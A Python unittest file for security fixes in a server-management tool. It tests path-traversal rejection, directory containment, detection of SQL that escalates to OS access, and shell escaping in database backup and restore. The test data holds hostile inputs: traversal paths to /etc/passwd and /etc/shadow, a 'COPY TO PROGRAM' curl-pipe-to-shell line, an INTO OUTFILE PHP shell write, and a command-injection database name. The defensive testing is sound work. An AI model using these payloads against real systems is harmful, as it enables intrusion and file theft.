"""
Regression tests for the security fixes V1-V4.

These cover:
  * V1/V2 - safe resource-name validation and directory containment used by the
    services/sites API to block path traversal and arbitrary file writes.
  * V3     - rejection of SQL that escalates to OS command/file access.
  * V4     - shell-argument escaping in the database backup/restore managers.

The validation helpers live in ``wasm.validators.webinput`` precisely so they can
be tested without the optional web stack (fastapi/jose) installed. The manager
tests stub out subprocess execution, so nothing runs against a real system.
"""

import shlex
import tempfile
import unittest
from pathlib import Path
from unittest.mock import patch

from wasm.validators.webinput import (
    is_safe_resource_name,
    is_within_directory,
    query_has_os_escalation,
)
from wasm.core.utils import CommandResult


def _ok(cmd, *args, **kwargs):
    """Fake _run/_run_sudo returning success with a numeric stdout (for stat)."""
    return CommandResult(success=True, stdout="123", stderr="", exit_code=0, command=cmd)


def _captured_bash_c(calls):
    """Extract the `bash -c <script>` payloads from captured command lists."""
    scripts = []
    for cmd in calls:
        if isinstance(cmd, list) and len(cmd) >= 3 and cmd[0] == "bash" and cmd[1] == "-c":
            scripts.append(cmd[2])
    return scripts


class TestSafeResourceName(unittest.TestCase):
    def test_accepts_legitimate_names(self):
        for name in ["myapp", "wasm-example-com", "app.example.com", "app_1", "ENV_VAR-2"]:
            self.assertTrue(is_safe_resource_name(name), name)

    def test_rejects_path_traversal_and_separators(self):
        bad = [
            "../../etc/passwd",
            "foo/bar",
            "foo\\bar",
            "..",
            "a..b",
            "name\x00",
            "",
            "-leadingdash",
            ".hidden",
            "/etc/cron.d/evil",
            "a" * 129,
        ]
        for name in bad:
            self.assertFalse(is_safe_resource_name(name), name)


class TestWithinDirectory(unittest.TestCase):
    def test_contained_paths(self):
        base = "/var/www/sites"
        self.assertTrue(is_within_directory(base, "/var/www/sites/example_com"))
        self.assertTrue(is_within_directory(base, base))  # equal is allowed

    def test_escaping_paths_rejected(self):
        base = "/var/www/sites"
        self.assertFalse(is_within_directory(base, "/var/www/sites/../../../etc/passwd"))
        self.assertFalse(is_within_directory(base, "/etc/passwd"))
        self.assertFalse(is_within_directory(base, "/var/www/sites-other/x"))

    def test_backup_dir_containment(self):
        # V4 (API): restore must stay inside the managed backup directory.
        backup_dir = "/var/backups/wasm/databases"
        self.assertTrue(is_within_directory(backup_dir, "/var/backups/wasm/databases/db.sql.gz"))
        self.assertFalse(is_within_directory(backup_dir, "/tmp/evil.sql.gz"))
        self.assertFalse(
            is_within_directory(backup_dir, "/var/backups/wasm/databases/../../../etc/shadow")
        )


class TestQueryOsEscalation(unittest.TestCase):
    def test_detects_os_escalation(self):
        bad = [
            "COPY t TO PROGRAM 'curl evil|sh'",
            "copy t from program 'x'",
            "SELECT secret INTO OUTFILE '/var/www/shell.php'",
            "SELECT x INTO DUMPFILE '/tmp/x'",
            "LOAD DATA INFILE '/etc/passwd' INTO TABLE t",
            "SELECT LOAD_FILE('/etc/passwd')",
            "SELECT pg_read_file('/etc/passwd')",
            "SELECT lo_export(1, '/tmp/x')",
            "SELECT sys_exec('id')",
        ]
        for q in bad:
            self.assertTrue(query_has_os_escalation(q), q)

    def test_allows_ordinary_sql(self):
        ok = [
            "SELECT * FROM users WHERE id = 1",
            "INSERT INTO logs (msg) VALUES ('hello')",
            "UPDATE accounts SET active = true",
            "DROP TABLE temp",
            "CREATE TABLE t (id int)",
            "SELECT program FROM scheduled_jobs",  # 'program' word alone is fine
        ]
        for q in ok:
            self.assertFalse(query_has_os_escalation(q), q)


class TestDatabaseShellEscaping(unittest.TestCase):
    """V4: backup/restore must shell-escape database names and paths."""

    EVIL = "db'; touch /tmp/pwned; '"

    def test_postgres_backup_escapes_database(self):
        from wasm.managers.database.postgres import PostgresManager

        calls = []
        with patch.object(PostgresManager, "_ensure_backup_dir", lambda self: None):
            mgr = PostgresManager(verbose=False)
            mgr._run = lambda cmd, *a, **k: (calls.append(cmd), _ok(cmd))[1]
            mgr._run_sudo = lambda cmd, *a, **k: (calls.append(cmd), _ok(cmd))[1]
            mgr.backup(self.EVIL, output_path=Path("/tmp/out.sql.gz"), compress=True)

        scripts = _captured_bash_c(calls)
        self.assertTrue(scripts, "expected a bash -c invocation")
        joined = "\n".join(scripts)
        # The evil name must appear only in its shlex-quoted form.
        self.assertIn(shlex.quote(self.EVIL), joined)
        self.assertNotIn("; touch /tmp/pwned;", joined.replace(shlex.quote(self.EVIL), ""))

    def test_postgres_restore_escapes_path_and_database(self):
        from wasm.managers.database.postgres import PostgresManager

        with tempfile.NamedTemporaryFile(suffix=".gz") as tmp:
            calls = []
            with patch.object(PostgresManager, "_ensure_backup_dir", lambda self: None), \
                 patch.object(PostgresManager, "database_exists", lambda self, name: True):
                mgr = PostgresManager(verbose=False)
                mgr._run = lambda cmd, *a, **k: (calls.append(cmd), _ok(cmd))[1]
                mgr._run_sudo = lambda cmd, *a, **k: (calls.append(cmd), _ok(cmd))[1]
                mgr.restore(self.EVIL, Path(tmp.name), drop_existing=False)

            scripts = _captured_bash_c(calls)
            self.assertTrue(scripts, "expected a bash -c invocation")
            joined = "\n".join(scripts)
            self.assertIn(shlex.quote(self.EVIL), joined)
            self.assertIn(shlex.quote(tmp.name), joined)

    def test_mysql_backup_escapes_database(self):
        from wasm.managers.database.mysql import MySQLManager

        with tempfile.NamedTemporaryFile(suffix=".sql.gz") as tmp:
            calls = []
            with patch.object(MySQLManager, "_ensure_backup_dir", lambda self: None), \
                 patch.object(MySQLManager, "database_exists", lambda self, name: True):
                mgr = MySQLManager(verbose=False)
                mgr._run_sudo = lambda cmd, *a, **k: (calls.append(cmd), _ok(cmd))[1]
                mgr._run = lambda cmd, *a, **k: (calls.append(cmd), _ok(cmd))[1]
                mgr.backup(self.EVIL, output_path=Path(tmp.name), compress=True)

            scripts = _captured_bash_c(calls)
            self.assertTrue(scripts, "expected a bash -c invocation")
            self.assertIn(shlex.quote(self.EVIL), "\n".join(scripts))


if __name__ == "__main__":
    unittest.main()
